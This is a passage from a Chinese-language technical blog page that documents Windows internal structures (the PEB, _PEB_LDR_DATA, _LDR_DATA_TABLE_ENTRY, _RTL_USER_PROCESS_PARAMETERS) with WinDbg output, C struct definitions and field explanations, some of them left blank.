，然而它甚至在2008年的版本5.1的最后一个持久的服务包中被保留了下来，显然微软从未警告过任何人。在最早的版本中，它得到了广泛的使用。内核访问PEB的方式需要与其他线程(最有可能是在用户模式下)的访问同步，原因之一是内核从进程堆中分配和释放。甚至到版本5.1，对于导出的函数RtlQueryRegistryValues(文档化)，这种以内核模式特权执行用户模式代码的情况仍在进行中，以扩展环境变量，其名称位于具有REG_EXPAND_SZ类型的注册表数据的百分号之间。</p></blockquote><ul><li><strong><code>0x01c FastPebLock</code></strong>：“_RTL_CRITICAL_SECTION”结构体指针。</li><li><strong><code>0x020 FastPebLockRoutine</code></strong>：RtlEnterCriticalSection函数地址。</li><li><strong><code>0x024 FastPebUnlockRoutine</code></strong>：RtlLeaveCriticalSection函数地址。</li><li><strong><code>0x028 EnvironmentUpdateCount</code></strong>：在那些拥有它的版本中，当尝试设置当前目录的距离达到NTDLL的RtlSetCurrentDirectory_U函数时，EnvironmentUpdateCount就会增加。这与任何类型的环境有什么关系尚不清楚。无论如何，Windows Vista都会用一组标志替换此计数器。</li><li><strong><code>0x02c KernelCallbackTable</code></strong>：KernelCallbackTable指向的是一个函数指针数组，以支持导出的KiUserCallbackDispatcher函数(未文档化)。这是NTDLL导出的为数不多的几个函数之一，这些函数不是由其他用户模式模块导入的，而是由内核找到的。当驱动程序(典型为WIN32K.SYS)调用内核导出KeUserModeCallback时，内核将调用该函数。当然，此NTDLL函数实际上不是由内核调用的。相反，它成为内核从Ring0到Ring3退出的目标地址。KiUserCallbackDispatcher感知到它已被调用，并且其参数中有一个KernelCallbackTable的索引。这样可以选择将执行进一步分配到更深的用户模式的位置。返回到内核模式并显示从一个调用返回到用户模式是非常重要的，因此需要有一个专用的中断号0x2B。<br>&emsp;&emsp;USER32.DLL会在初始化期间将函数指针数组KernelCallbackTable设置到位，但要等到USER32连接到CSRSS服务器之后才能进行设置。从版本6.0开始，如果该进程是所谓的受保护进程，则首先将KernelCallbackTable指针作为UserSharedInfoPtr承担双重责任。就在连接时，它成为直接从WIN32K.SYS接收SHAREDINFO结构的辅助通道。</li><li><strong><code>0x030 SystemReserved</code></strong>：</li><li><strong><code>0x034 AtlThunkSListPtr32</code></strong>：</li><li><strong><code>0x038 FreeList</code></strong>：“_PEB_FREE_BLOCK”结构体指针。_PEB_FREE_BLOCK只是一个指向其类型的Next指针，可能是为了创建一个单链表和一个32位的无符号大小。建议缓存已释放的内存，但尽管FreeList是在符号文件中定义的，但在任何版本中都不知道它的用途。替代它的ApiSetMap是进程的指针，其指向NTDLL在加载dll时应用的重定向的API集模式的内核表示。内核将ApiSetMap指向的是一个进程地址空间中的只读映射。将ApiSetMap指向其他地方似乎不仅是可行的，而且是有吸引力的，无论是为了恶作剧，还是为了安全工具作为通过修补代码等技术Hook API函数的替代手段的所谓善意入侵。</li><li><strong><code>0x03c TlsExpansionCounter</code></strong>：TLS(Thread Local Storage)扩展计数。</li><li><strong><code>0x040 TlsBitmap</code></strong>：</li><li><strong><code>0x044 TlsBitmapBits</code></strong>：</li><li><strong><code>0x04c ReadOnlySharedMemoryBase</code></strong>：</li><li><strong><code>0x050 ReadOnlySharedMemoryHeap</code></strong>：只读共享内存堆。</li><li><strong><code>0x054 ReadOnlyStaticServerData</code></strong>：</li><li><strong><code>0x058 AnsiCodePageData</code></strong>：</li><li><strong><code>0x05c OemCodePageData</code></strong>：</li><li><strong><code>0x060 UnicodeCaseTableData</code></strong>：</li><li><strong><code>0x064 NumberOfProcessors</code></strong>：处理器数量。</li><li><strong><code>0x068 NtGlobalFlag</code></strong>：NtGlobalFlag成员最初是进程对内核导出的NtGlobalFlag变量的拷贝，就像内核创建PEB时一样。在版本5.0之前，这似乎只是一个方便NTDLL来初始化它自己的(内部的)NtGlobalFlag变量的成员，而不必通过NtQuerySystemInformation调用。</li><li><strong><code>0x070 CriticalSectionTimeout</code></strong>：“_LARGE_INTEGER”有符号64位整数。</li><li><strong><code>0x078 HeapSegmentReserve</code></strong>：HeapSegment预留内存大小，以字节为单位。在该进程中创建堆时，如果RtlCreateHeap函数的参数Parameters中的SegmentReserve未设置时，所使用的默认值，默认为1MB=0x100000。</li><li><strong><code>0x07c HeapSegmentCommit</code></strong>：HeapSegment提交内存大小，以字节为单位。在该进程中创建堆时，如果RtlCreateHeap函数的参数Parameters中的SegmentCommit未设置时，所使用的默认值，默认为8KB=PAGE_SIZE*2=0x2000。</li><li><strong><code>0x080 HeapDeCommitTotalFreeThreshold</code></strong>：解除提交的总空闲空间阈值，以字节为单位。在该进程中创建堆时，如果RtlCreateHeap函数的参数Parameters中的DeCommitTotalFreeThreshold未设置时，所使用的默认值，默认为64KB=0x10000。</li><li><strong><code>0x084 HeapDeCommitFreeBlockThreshold</code></strong>：解除提交的空闲块的单块阈值，以字节为单位。在该进程中创建堆时，如果RtlCreateHeap函数的参数Parameters中的DeCommitFreeBlockThreshold未设置时，所使用的默认值，默认为4KB=PAGE_SIZE=0x1000。</li><li><strong><code>0x088 NumberOfHeaps</code></strong>：本进程中堆的数量。</li><li><strong><code>0x08c MaximumNumberOfHeaps</code></strong>：本进程中堆的最大数量。</li><li><strong><code>0x090 ProcessHeaps</code></strong>：本进程中的堆的列表。</li><li><strong><code>0x094 GdiSharedHandleTable</code></strong>：</li><li><strong><code>0x098 ProcessStarterHelper</code></strong>：</li><li><strong><code>0x09c GdiDCAttributeList</code></strong>：</li><li><strong><code>0x0a0 LoaderLock</code></strong>：“_RTL_CRITICAL_SECTION”体结构指针，ntdll!LdrpLoaderLock。</li></ul><blockquote><p>&emsp;&emsp;从OSMajorVersion开始的几个成员的关键在于，它们并不需要真正的操作系统版本号。取而代之的是，它们可以是进程中用户模式代码可以识别的任何版本号。这是否会发生取决于进程的可执行文件的IMAGE_OPTIONAL_HEADER中的Win32VersionValue。直到今天，也就是2019年3月30日，微软的文档中都写着“此成员是保留的，必须为0”。然而，如果它是非零的，就像使用链接器的未文档化的“/win32version”开关所安排的那样，则内核会使用真实的Windows版本号覆盖这些PEB成员中的值：</p><p>OsMajorVersion：Win32VersionValue的0~7位。<br>OSMinorVersion：Win32VersionValue的8~15位。<br>OSBuildNumber：Win32VersionValue的16~29位。<br>OSCSDVersion：IMAGE_LOAD_CONFIG_DIRECTORY的CSDVersion成员(如果非零)，在版本5.0或更高版本中。<br>OSPlatformId：Win32VersionValue的30~31位，0、1、2和3分别映射到2(VER_PLATFORM_WIN32_NT)、3、0和1。</p></blockquote><ul><li><strong><code>0x0a4 OSMajorVersion</code></strong>：Windows的主版本号。</li><li><strong><code>0x0a8 OSMinorVersion</code></strong>：Windows的次版本号。</li><li><strong><code>0x0ac OSBuildNumber</code></strong>：Windows的构建号。</li><li><strong><code>0x0ae OSCSDVersion</code></strong>：与Windows安装的Service Pack版本有关。</li></ul><blockquote><p>HKLM\system\CurrentControlSet\control\windows\CSDVersion<br>未安装Service Pack：OSCSDVersion = 0<br>安装了Service Pack 1：OSCSDVersion = 0x100<br>安装了Service Pack 2：OSCSDVersion = 0x200<br>安装了Service Pack 3：OSCSDVersion = 0x300<br>以此类推。</p></blockquote><ul><li><strong><code>0x0b0 OSPlatformId</code></strong>：</li><li><strong><code>0x0b4 ImageSubsystem</code></strong>：</li><li><strong><code>0x0b8 ImageSubsystemMajorVersion</code></strong>：</li><li><strong><code>0x0bc ImageSubsystemMinorVersion</code></strong>：</li><li><strong><code>0x0c0 ImageProcessAffinityMask</code></strong>：</li><li><strong><code>0x0c4 GdiHandleBuffer</code></strong>：</li><li><strong><code>0x14c PostProcessInitRoutine</code></strong>：</li><li><strong><code>0x150 TlsExpansionBitmap</code></strong>：</li><li><strong><code>0x154 TlsExpansionBitmapBits</code></strong>：</li><li><strong><code>0x1d4 SessionId</code></strong>：与当前进程相关联的终端服务会话标识符。SessionId是Microsoft在需要公开所谓的中间件对内部API的使用时文档化的两个PEB成员之一。</li></ul><blockquote><p>&emsp;&emsp;AppCompatFlags和AppCompatFlagsUser成员是由APPHELP.DLL从TAG_FLAG_MASK_KERNEL(0x5005)和TAG_FLAG_MASK_USER(0x5008)标记设置的，用于SDB文件中的进程描述。在编译SDB文件所用的XML中，这两个变量分别从类型属性为KERNEL或USER的\<flag\>标记中的MASK属性计算。</flag\></p></blockquote><ul><li><strong><code>0x1d8 AppCompatFlags</code></strong>：“_ULARGE_INTEGER”无符号64位整数。</li><li><strong><code>0x1e0 AppCompatFlagsUser</code></strong>：“_ULARGE_INTEGER”无符号64位整数。</li><li><strong><code>0x1e8 pShimData</code></strong>：</li><li><strong><code>0x1ec AppCompatInfo</code></strong>：</li><li><strong><code>0x1f0 CSDVersion</code></strong>：“_UNICODE_STRING”结构Unicode字符串，指示当前系统安装的最新Service Pack版本。如：“Service Pack 3”。</li><li><strong><code>0x1f8 ActivationContextData</code></strong>：</li><li><strong><code>0x1fc ProcessAssemblyStorageMap</code></strong>：</li><li><strong><code>0x200 SystemDefaultActivationContextData</code></strong>：</li><li><strong><code>0x204 SystemAssemblyStorageMap</code></strong>：</li><li><strong><code>0x208 MinimumStackCommit</code></strong>：</li></ul><h4 id="PEB-LDR-DATA"><a href="#PEB-LDR-DATA" class="headerlink" title="_PEB_LDR_DATA"></a>_PEB_LDR_DATA</h4><p>&emsp;&emsp;这个结构用于存储当前进程中已加载的模块的链表。该结构拥有三个双链表(_LIST_ENTRY)，InLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList。链表中的存储的指针为_LDR_DATA_TABLE_ENTRY结构体指针，其保存一个已加载模块的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _PEB_LDR_DATA</span><br><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x28 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;                                        <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Initialized;                                   <span class="comment">//0x4</span></span><br><span class="line">    VOID* SsHandle;                                      <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderModuleList</span>;</span>            <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderModuleList</span>;</span>          <span class="comment">//0x14</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderModuleList</span>;</span>  <span class="comment">//0x1c</span></span><br><span class="line">    VOID* EntryInProgress;                               <span class="comment">//0x24</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 Length</code></strong>：此结构体的大小。</li><li><strong><code>0x004 Initialized</code></strong>：是否已初始化。如果设置了，则当前进程的加载器数据段已被初始化。</li><li><strong><code>0x008 SsHandle</code></strong>：</li><li><strong><code>0x00c InLoadOrderModuleList</code></strong>：以加载顺序形成的已加载模块双链表。</li><li><strong><code>0x014 InMemoryOrderModuleList</code></strong>：以模块在进程虚拟地址空间中的布局顺序形成的已加载模块双链表。</li><li><strong><code>0x01c InInitializationOrderModuleList</code></strong>：以初始化顺序形成的已加载模块双链表。</li><li><strong><code>0x024 EntryInProgress</code></strong>：</li></ul><p>&emsp;&emsp;每个加载到进程中的DLL模块都有与之对应的_LDR_DATA_TABLE_ENTRY结构体，这些结构体相互链接，最终形成_LIST_ENTRY双链表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">015</span>&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x034</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : Uint2B</span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : Uint2B</span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x50 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>           <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>         <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span> <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                 <span class="comment">//0x18</span></span><br><span class="line">    VOID* EntryPoint;                              <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                             <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>            <span class="comment">//0x24</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>            <span class="comment">//0x2c</span></span><br><span class="line">    ULONG Flags;                                   <span class="comment">//0x34</span></span><br><span class="line">    USHORT LoadCount;                              <span class="comment">//0x38</span></span><br><span class="line">    USHORT TlsIndex;                               <span class="comment">//0x3a</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">HashLinks</span>;</span>              <span class="comment">//0x3c</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* SectionPointer;                  <span class="comment">//0x3c</span></span><br><span class="line">            ULONG CheckSum;                        <span class="comment">//0x40</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG TimeDateStamp;                       <span class="comment">//0x44</span></span><br><span class="line">        VOID* LoadedImports;                       <span class="comment">//0x44</span></span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* EntryPointActivationContext;             <span class="comment">//0x48</span></span><br><span class="line">    VOID* PatchInformation;                        <span class="comment">//0x4c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 InLoadOrderLinks</code></strong>：以加载顺序形成的已加载模块双链表。</li><li><strong><code>0x008 InMemoryOrderLinks</code></strong>：以模块在进程虚拟地址空间中的布局顺序形成的已加载模块双链表。</li><li><strong><code>0x010 InInitializationOrderLinks</code></strong>：以初始化顺序形成的已加载模块双链表。</li><li><strong><code>0x018 DllBase</code></strong>：本模块加载到进程中的基址。</li><li><strong><code>0x01c EntryPoint</code></strong>：本模块的入口点地址(例如：DllMain)。</li><li><strong><code>0x020 SizeOfImage</code></strong>：本模块占用进程虚拟地址空间内存的大小。</li><li><strong><code>0x024 FullDllName</code></strong>：_UNICODE_STRING结构，本模块在硬盘上的全路径名称。</li><li><strong><code>0x02c BaseDllName</code></strong>：_UNICODE_STRING结构，本模块的模块名。</li><li><strong><code>0x034 Flags</code></strong>：针对该模块的加载器状态标志。如：LDRP_STATIC_LINK = 0x00000002</li><li><strong><code>0x038 LoadCount</code></strong>：本模块的引用计数(即它被加载的次数)</li><li><strong><code>0x03a TlsIndex</code></strong>：与本模块相关联的线程本地存储槽(Thread Local Storage Slot)。</li><li><strong><code>0x03c HashLinks</code></strong>：在进程启动和关闭期间使用的链表，以便更快地查找。</li><li><strong><code>0x03c SectionPointer</code></strong>：</li><li><strong><code>0x040 CheckSum</code></strong>：</li><li><strong><code>0x044 TimeDateStamp</code></strong>：当本模块被链接时由链接器写入的时间戳，加载器从该模块的映像文件的PE头中获得此时间戳信息。IMAGE_FILE_HEADER-&gt;TimeDateStamp。</li><li><strong><code>0x044 LoadedImports</code></strong>：</li><li><strong><code>0x048 EntryPointActivationContext</code></strong>：包含了当调用初始化例程时的SxS/Fusion激活环境。</li><li><strong><code>0x04c PatchInformation</code></strong>：在此模块上进行热补丁操作相关的信息。</li></ul><p>&emsp;&emsp;“_PEB_LDR_DATA”结构中的InLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList分别是以三种顺序形成的已加载模块链表的头结点，之后的链表结点中的指针都是“_LDR_DATA_TABLE_ENTRY”结构指针。每个链表结点中的指针指向的是相应结构体中的特定位置，不全是结构体的起始地址。如：“_PEB_LDR_DATA”的InLoadOrderModuleList中的指针指向的是“以加载顺序形成的已加载模块双链表”的第一个结点和最后一个结点的结构体“_LDR_DATA_TABLE_ENTRY”中的InLoadOrderLinks成员所在地址。“_PEB_LDR_DATA”的InInitializationOrderModuleList中的指针指向的是“以初始化顺序形成的已加载模块双链表”的第一个结点和最后一个结点的结构体“_LDR_DATA_TABLE_ENTRY”中的InInitializationOrderLinks成员所在地址。</p><h4 id="RTL-USER-PROCESS-PARAMETERS"><a href="#RTL-USER-PROCESS-PARAMETERS" class="headerlink" title="_RTL_USER_PROCESS_PARAMETERS"></a>_RTL_USER_PROCESS_PARAMETERS</h4><p>RtlCreateProcessParameters(),RtlCreateProcessParametersEx()<br>RtlpInitEnvironmentBlock()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">ntdll!_RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x000</span> MaximumLength    : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DebugFlags       : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> ConsoleHandle    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> ConsoleFlags     : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> StandardInput    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> StandardOutput   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> StandardError    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x024</span> CurrentDirectory : _CURDIR</span><br><span class="line">   +<span class="number">0x030</span> DllPath          : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x038</span> ImagePathName    : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x040</span> CommandLine      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x048</span> Environment      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> StartingX        : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> StartingY        : Uint4B</span><br><span class="line">   +<span class="number">0x054</span> CountX           : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> CountY           : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> CountCharsX      : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> CountCharsY      : Uint4B</span><br><span class="line">   +<span class="number">0x064</span> FillAttribute    : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> WindowFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x06c</span> ShowWindowFlags  : Uint4B</span><br><span class="line">   +<span class="number">0x070</span> WindowTitle      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x078</span> DesktopInfo      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x080</span> ShellInfo        : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x088</span> RuntimeData      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x090</span> CurrentDirectores : [<span class="number">32</span>] _RTL_DRIVE_LETTER_CURDIR</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x290 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG MaximumLength;                                    <span class="comment">//0x0</span></span><br><span class="line">    ULONG Length;                                           <span class="comment">//0x4</span></span><br><span class="line">    ULONG Flags;                                            <span class="comment">//0x8</span></span><br><span class="line">    ULONG DebugFlags;                                       <span class="comment">//0xc</span></span><br><span class="line">    VOID* ConsoleHandle;                                    <span class="comment">//0x10</span></span><br><span class="line">    ULONG ConsoleFlags;                                     <span class="comment">//0x14</span></span><br><span class="line">    VOID* StandardInput;                                    <span class="comment">//0x18</span></span><br><span class="line">    VOID* StandardOutput;                                   <span class="comment">//0x1c</span></span><br><span class="line">    VOID* StandardError;                                    <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CURDIR</span> <span class="title">CurrentDirectory</span>;</span>                        <span class="comment">//0x24</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DllPath</span>;</span>                         <span class="comment">//0x30</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">ImagePathName</span>;</span>                   <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">CommandLine</span>;</span>                     <span class="comment">//0x40</span></span><br><span class="line">    VOID* Environment;                                      <span class="comment">//0x48</span></span><br><span class="line">    ULONG StartingX;                                        <span class="comment">//0x4c</span></span><br><span class="line">    ULONG StartingY;                                        <span class="comment">//0x50</span></span><br><span class="line">    ULONG CountX;                                           <span class="comment">//0x54</span></span><br><span class="line">    ULONG CountY;                                           <span class="comment">//0x58</span></span><br><span class="line">    ULONG CountCharsX;                                      <span class="comment">//0x5c</span></span><br><span class="line">    ULONG CountCharsY;                                      <span class="comment">//0x60</span></span><br><span class="line">    ULONG FillAttribute;                                    <span class="comment">//0x64</span></span><br><span class="line">    ULONG WindowFlags;                                      <span class="comment">//0x68</span></span><br><span class="line">    ULONG ShowWindowFlags;                                  <span class="comment">//0x6c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">WindowTitle</span>;</span>                     <span class="comment">//0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DesktopInfo</span>;</span>                     <span class="comment">//0x78</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">ShellInfo</span>;</span>                       <span class="comment">//0x80</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">RuntimeData</span>;</span>                     <span class="comment">//0x88</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_DRIVE_LETTER_CURDIR</span> <span class="title">CurrentDirectores</span>[32];</span>  <span class="comment">//0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 MaximumLength</code></strong>：</li><li><strong><code>0x004 Length</code></strong>：</li><li><strong><code>0x008 Flags</code></strong>：</li><li><strong><code>0x00c DebugFlags</code></strong>：</li><li><strong><code>0x010 ConsoleHandle</code></strong>：</li><li><strong><code>0x014 ConsoleFlags</code></strong>：</li><li><strong><code>0x018 StandardInput</code></strong>：</li><li><strong><code>0x01c StandardOutput</code></strong>：</li><li><strong><code>0x020 StandardError</code></strong>：</li><li><strong><code>0x024 CurrentDirectory</code></strong>：</li><li><strong><code>0x030 DllPath</code></strong>：</li><li><strong><code>0x038 ImagePathName</code></strong>：</li><li><strong><code>0x040 CommandLine</code></strong>：</li><li><strong><code>0x048 Environment</code></strong>：</li><li><strong><code>0x04c StartingX</code></strong>：</li><li><strong><code>0x050 StartingY</code></strong>：</li><li><strong><code>0x054 CountX</code></strong>：</li><li><strong><code>0x058 CountY</code></strong>：</li><li><strong><code>0x05c CountCharsX</code></strong>：</li><li><strong><code>0x060 CountCharsY</code></strong>：</li><li><strong><code>0x064 FillAttribute</code></strong>：</li><li><strong><code>0x068 WindowFlags</code></strong>：</li><li><strong><code>0x06c ShowWindowFlags</code></strong>：</li><li><strong><code>0x070 WindowTitle</code></strong>：</li><li><strong><code>0x078 DesktopInfo</code></strong>：</li><li><strong><code>0x080 ShellInfo</code></strong>：</li><li><strong><code>0x088 RuntimeData</code></strong>：</li><li><strong><code>0x090 CurrentDirectores</code></strong>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span 